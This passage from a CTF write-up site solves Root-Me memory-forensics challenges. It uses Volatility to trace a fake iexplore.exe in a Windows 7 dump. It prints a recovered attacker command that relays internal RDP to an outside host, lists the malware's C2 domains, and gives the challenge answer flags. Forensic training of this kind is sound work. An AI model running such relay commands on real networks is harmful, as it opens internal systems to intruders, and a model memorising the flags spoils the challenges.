1. [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)
2. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).

### Link

1. [ch3.php](http://challenge01.root-me.org/forensic/ch3/ch3.php).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185769248 (177M) [application/octet-stream]
Saving to: ‘ch2.tbz2’

ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     

2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
$ bzip2 -d ch2.tbz2 
$ file 
ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
$ tar -xvf ch2.tar 
ch2.dmp
$ file ch2.dmp 
ch2.dmp: data
~~~

The memory dump can be investigated:

~~~shell
$ volatility imageinfo -f ch2.dmp
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100

~~~

This provides the profile and shows the memory dump is from a Windows machine.  The process tree can be dumped:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0x892ac2b8:wininit.exe                               456    396      3     77 2013-01-12 16:38:14 UTC+0000
. 0x896294c0:services.exe                             560    456      6    205 2013-01-12 16:38:16 UTC+0000
.. 0x89805420:svchost.exe                             832    560     19    435 2013-01-12 16:38:23 UTC+0000
... 0x87c90d40:audiodg.exe                           1720    832      5    117 2013-01-12 16:58:11 UTC+0000
.. 0x89852918:svchost.exe                             904    560     17    409 2013-01-12 16:38:24 UTC+0000
... 0x87ad44d0:dwm.exe                               2496    904      5     77 2013-01-12 16:40:25 UTC+0000
.. 0x898b2790:svchost.exe                            1172    560     15    475 2013-01-12 16:38:27 UTC+0000
.. 0x89f3d2c0:svchost.exe                            3352    560      9    141 2013-01-12 16:40:58 UTC+0000
.. 0x898fbb18:SearchIndexer.                         2900    560     13    636 2013-01-12 16:40:38 UTC+0000
.. 0x8986b030:svchost.exe                             928    560     26    869 2013-01-12 16:38:24 UTC+0000
.. 0x8a1d84e0:vmtoolsd.exe                           1968    560      6    220 2013-01-12 16:39:14 UTC+0000
.. 0x8962f030:svchost.exe                             692    560     10    353 2013-01-12 16:38:21 UTC+0000
.. 0x898911a8:svchost.exe                            1084    560     10    257 2013-01-12 16:38:26 UTC+0000
.. 0x898a7868:AvastSvc.exe                           1220    560     66   1180 2013-01-12 16:38:28 UTC+0000
.. 0x89f1d3e8:svchost.exe                            3624    560     14    348 2013-01-12 16:41:22 UTC+0000
.. 0x9542a030:TPAutoConnSvc.                         1612    560      9    135 2013-01-12 16:39:23 UTC+0000
... 0x87ae2880:TPAutoConnect.                        2568   1612      5    146 2013-01-12 16:40:28 UTC+0000
.. 0x88cded40:sppsvc.exe                             1872    560      4    143 2013-01-12 16:39:02 UTC+0000
.. 0x8a102748:svchost.exe                            1748    560     18    310 2013-01-12 16:38:58 UTC+0000
.. 0x8a0f9c40:spoolsv.exe                            1712    560     14    338 2013-01-12 16:38:58 UTC+0000
.. 0x9541c7e0:wlms.exe                                336    560      4     45 2013-01-12 16:39:21 UTC+0000
.. 0x8a1f5030:VMUpgradeHelpe                          448    560      4     89 2013-01-12 16:39:21 UTC+0000
... 0x892ced40:winlogon.exe                           500    448      3    111 2013-01-12 16:38:14 UTC+0000
... 0x88d03a00:csrss.exe                              468    448     10    471 2013-01-12 16:38:14 UTC+0000
.... 0x87c595b0:conhost.exe                          3228    468      2     54 2013-01-12 16:44:50 UTC+0000
.... 0x87a9c288:conhost.exe                          2600    468      1     35 2013-01-12 16:40:28 UTC+0000
.... 0x954826b0:conhost.exe                          2168    468      2     49 2013-01-12 16:55:50 UTC+0000
.. 0x87bd35b8:wmpnetwk.exe                           3176    560      9    240 2013-01-12 16:40:48 UTC+0000
.. 0x87ac0620:taskhost.exe                           2352    560      8    149 2013-01-12 16:40:24 UTC+0000
.. 0x897b5c20:svchost.exe                             764    560      7    263 2013-01-12 16:38:23 UTC+0000
. 0x8962f7e8:lsm.exe                                  584    456     10    142 2013-01-12 16:38:16 UTC+0000
. 0x896427b8:lsass.exe                                576    456      6    566 2013-01-12 16:38:16 UTC+0000
 0x8929fd40:csrss.exe                                 404    396      9    469 2013-01-12 16:38:14 UTC+0000
 0x87978b78:System                                      4      0    103   3257 2013-01-12 16:38:09 UTC+0000
. 0x88c3ed40:smss.exe                                 308      4      2     29 2013-01-12 16:38:09 UTC+0000
 0x87ac6030:explorer.exe                             2548   2484     24    766 2013-01-12 16:40:27 UTC+0000
. 0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
.. 0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
. 0x95495c18:taskmgr.exe                             1232   2548      6    116 2013-01-12 16:42:29 UTC+0000
. 0x87bf7030:cmd.exe                                 3152   2548      1     23 2013-01-12 16:44:50 UTC+0000
.. 0x87cbfd40:winpmem-1.3.1.                         3144   3152      1     23 2013-01-12 16:59:17 UTC+0000
. 0x898fe8c0:StikyNot.exe                            2744   2548      8    135 2013-01-12 16:40:32 UTC+0000
. 0x87b784b0:AvastUI.exe                             2720   2548     14    220 2013-01-12 16:40:31 UTC+0000
. 0x87b82438:VMwareTray.exe                          2660   2548      5     80 2013-01-12 16:40:29 UTC+0000
. 0x87c6a2a0:swriter.exe                             3452   2548      1     19 2013-01-12 16:41:01 UTC+0000
.. 0x87ba4030:soffice.exe                            3512   3452      1     28 2013-01-12 16:41:03 UTC+0000
... 0x87b8ca58:soffice.bin                           3564   3512     12    400 2013-01-12 16:41:05 UTC+0000
. 0x9549f678:iexplore.exe                            1136   2548     18    454 2013-01-12 16:57:44 UTC+0000
.. 0x87d4d338:iexplore.exe                           3044   1136     37    937 2013-01-12 16:57:46 UTC+0000
. 0x87aa9220:VMwareUser.exe                          2676   2548      8    190 2013-01-12 16:40:30 UTC+0000
 0x95483d18:soffice.bin                              3556   3544      0 ------ 2013-01-12 16:41:05 UTC+0000
~~~

The cmd.exe is shown as a child process of internet explorer (pids 1616 and 2772)?  There is something suspicious here. The handles can be found.  Staring with Mutants:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 handles -p 1616 -t Mutant
Volatility Foundation Volatility Framework 2.6.1
Offset(V)     Pid     Handle     Access Type             Details
---------- ------ ---------- ---------- ---------------- -------
0x89f52748   1616       0xe0   0x1f0001 Mutant           
0x89f3d0a8   1616      0x218   0x1f0001 Mutant           
0x88baedf0   1616      0x220   0x1f0001 Mutant 
~~~

The file handles can also be retrieved:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 handles -p 1616 -t File
Volatility Foundation Volatility Framework 2.6.1
Offset(V)     Pid     Handle     Access Type             Details
---------- ------ ---------- ---------- ---------------- -------
0x87d1e8f0   1616       0x20   0x12019f File             \Device\aswSP_Open
0x87b47e10   1616       0x24   0x120089 File             \Device\aswSnx
0x892f9a30   1616       0x30   0x16019f File             \Device\Afd\Endpoint
0x87b9ab28   1616       0x40   0x120089 File             \Device\HarddiskVolume1\Windows\System32\en-US\cmd.exe.mui
0x892f9a30   1616       0x5c   0x16019f File             \Device\Afd\Endpoint
0x87ba46d8   1616       0x88   0x100020 File             \Device\HarddiskVolume1\Windows\winsxs\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc
0x87bac1f0   1616       0xc8   0x100001 File             \Device\KsecDD
0x87c4a038   1616      0x1fc   0x100020 File             \Device\HarddiskVolume1\Users\JOHNDO~1\AppData\Local\Temp
~~~

Reviewing the iexplorer.exe:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 dlllist -p 2772
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
iexplore.exe pid:   2772
Command line : "C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe" 


Base             Size  LoadCount LoadTime                       Path
---------- ---------- ---------- ------------------------------ ----
0x00400000     0x6000     0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe
0x77660000   0x13c000     0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
0x70e70000    0x3c000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Program Files\AVAST Software\Avast\snxhk.dll
0x77480000    0xd4000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\KERNEL32.dll
0x75920000    0x4a000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\KERNELBASE.dll
0x76a60000    0xac000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\msvcrt.dll
0x777a0000    0x35000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\WS2_32.DLL
0x76c10000    0xa1000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\RPCRT4.dll
0x77880000     0x6000     0xffff 2013-01-12 16:40:34 UTC+0000   C:\Windows\system32\NSI.dll
0x751f0000    0x3c000        0x4 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\mswsock.dll
0x76990000    0xc9000       0x18 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\user32.dll
0x75ab0000    0x4e000       0x15 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\GDI32.dll
0x76980000     0xa000        0x6 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\LPK.dll
0x777e0000    0x9d000        0x6 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\USP10.dll
0x75b00000    0x1f000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\IMM32.DLL
0x77210000    0xcc000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\MSCTF.dll
0x750b0000    0x44000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\DNSAPI.dll
0x76ec0000    0x19000        0x2 2013-01-12 16:55:34 UTC+0000   C:\Windows\SYSTEM32\sechost.dll
0x73fa0000    0x1c000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\IPHLPAPI.DLL
0x73f80000     0x7000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\WINNSI.DLL
0x727d0000     0x6000        0x1 2013-01-12 16:55:34 UTC+0000   C:\Windows\system32\rasadhlp.dll
0x74d40000     0x5000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\wshtcpip.dll
0x747b0000    0x10000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\NLAapi.dll
0x72810000     0x8000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\winrnr.dll
0x72800000    0x10000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\napinsp.dll
0x727e0000    0x12000        0x2 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\pnrpnsp.dll
0x73d80000    0x38000        0x1 2013-01-12 16:55:49 UTC+0000   C:\Windows\System32\fwpuclnt.dll
0x756b0000    0x4b000     0xffff 2013-01-12 16:55:49 UTC+0000   C:\Windows\system32\apphelp.dll
~~~

The directory C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe can be hashed to generate the answer

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
49979149632639432397b3a1df8cb43d
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


## Command and Control level 4

- Author: Thanat0s
- Date: 16 February 2013
- Points: 35
- Level: 3

### Statement

Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers!

The validation flag should have this format : IP:PORT

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de

### Resources

1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).

### Link

1. [ch4.php](http://challenge01.root-me.org/forensic/ch4/ch4.php).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185769248 (177M) [application/octet-stream]
Saving to: ‘ch2.tbz2’

ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     

2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
$ bzip2 -d ch2.tbz2 
$ file 
ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
$ tar -xvf ch2.tar 
ch2.dmp
$ file ch2.dmp 
ch2.dmp: data
~~~

The memory dump can be investigated:

~~~shell
$ volatility imageinfo -f ch2.dmp
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100

~~~

Using the solution to the previous challenge, the pid2772 connections can be found using netscan:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 netscan | grep 2772
Volatility Foundation Volatility Framework 2.6.1
0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe 
~~~

The console command history (cmd.exe) can be found:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 consoles
Volatility Foundation Volatility Framework 2.6.1
**************************************************
ConsoleProcess: conhost.exe Pid: 3228
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: Command Prompt
Title: Administrator: Command Prompt - winpmem-1.3.1.exe  ram.dmp
AttachedProcess: winpmem-1.3.1. Pid: 3144 Handle: 0x90
AttachedProcess: cmd.exe Pid: 3152 Handle: 0x64
----
CommandHistory: 0x3007a8 Application: winpmem-1.3.1.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x90
----
CommandHistory: 0x2ff638 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
Cmd #0 at 0x2fcd58: cd %temp%
Cmd #1 at 0x2fd348: dir
Cmd #2 at 0x2e1038: cd imagedump
Cmd #3 at 0x2fd378: dir
Cmd #4 at 0x304870: winpmem-1.3.1.exe ram.dmp
----
Screen 0x2e64b8 X:80 Y:300
Dump:

**************************************************
ConsoleProcess: conhost.exe Pid: 2168
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
----
CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427890 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
----
Screen 0x416348 X:80 Y:300
Dump:
~~~

Process conhost.exe Pid: 2168 has PID 1616 as an attached process.  A memorydump can be generated for this process:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 memdump -p 2168 -D ./
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing conhost.exe [  2168] to 2168.dmp
~~~

The tcpreplay executable is associated with this process, we can search the memory dump for this string:

~~~shell
$ strings 2168.dmp | grep tcprelay
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
tcprelay.c
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
~~~

The private IP address and port can be used to validate the challenge

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
192.168.0.22:3389
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


## Command and Control level 6

- Author: Thanat0s
- Date: 16 February 2013
- Points: 50
- Level: 3

### Statement

Berthier, before blocking any of the malware’s traffic on our firewalls, we need to make sure we found all its C&C. This will let us know if there are other infected hosts on our network and be certain we’ve locked the attackers out. That’s it Berthier, we’re almost there, reverse this malware!

The validation password is a fully qualified domain name : hote.domaine.tld

The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de
NB : This challenge require the clearance of the level 3.

### Resources

1. [Volatility Cheatsheet v2.4](https://repository.root-me.org/Forensic/EN%20-%20Volatility%20cheatsheet%20v2.4.pdf).

### Link

1. [ch6.php](http://challenge01.root-me.org/forensic/ch6/ch6.php).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Visiting the challenge site, the challenge file [ch2.tbz2](http://challenge01.root-me.org/forensic/ch2/ch2.tbz2) can be found.  This can be downloaded, decompiled and reviewed:

~~~shell
$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
--2022-01-29 14:02:21--  http://challenge01.root-me.org/forensic/ch2/ch2.tbz2
Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185769248 (177M) [application/octet-stream]
Saving to: ‘ch2.tbz2’

ch2.tbz2                                                    100%[=========================================================================================================================================>] 177.16M  13.7MB/s    in 18s     

2022-01-29 14:02:39 (9.73 MB/s) - ‘ch2.tbz2’ saved [185769248/185769248]
$ bzip2 -d ch2.tbz2 
$ file 
ch2.tar              ch5.php              .engauge.log         .~lock.Durham.docx#  
$ tar -xvf ch2.tar 
ch2.dmp
$ file ch2.dmp 
ch2.dmp: data
~~~

The memory dump can be investigated:

~~~shell
$ volatility imageinfo -f ch2.dmp
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/derek/Downloads/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100

~~~

Using the solution to the previous challenge, the pid2772 connections can be found using netscan:

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 netscan | grep 2772
Volatility Foundation Volatility Framework 2.6.1
0x1dedb4f8         TCPv4    127.0.0.1:49178                127.0.0.1:12080      ESTABLISHED      2772     iexplore.exe 
~~~

The malware executable can be exported using procdump

~~~shell
$ volatility -f ch2.dmp --profile=Win7SP0x86 procdump -p 2772 --dump-dir ./
Volatility Foundation Volatility Framework 2.6.1
Process(V) ImageBase  Name                 Result
---------- ---------- -------------------- ------
0x87b6b030 0x00400000 iexplore.exe         OK: executable.2772.exe
~~~

This executable.2772.exe binary can be exported to an [online Malware analysis site](https://www.hybrid-analysis.com).  This aligns to existing reports for executable.2772.exe which shows the DNS queries:

~~~
Domain 	Address 	Registrar 	Country
ns2.wrauzfevvo.com 	- 	- 	-
whereare.sexy-serbian 	- 	- 	-
y0ug.itisjustluck.com 	- 	- 	-
th1sis.l1k3aK3y.org 	- 	- 	-
furious.devilslife.com 	106.187.41.154 	- 	Flag of Japan Japan
~~~

The answer is the like a key.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
th1sis.l1k3aK3y.org
~~~

</details>

---

### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

Last updated Jan 2022.

## [djm89uk.github.io](https://djm89uk.github.io)
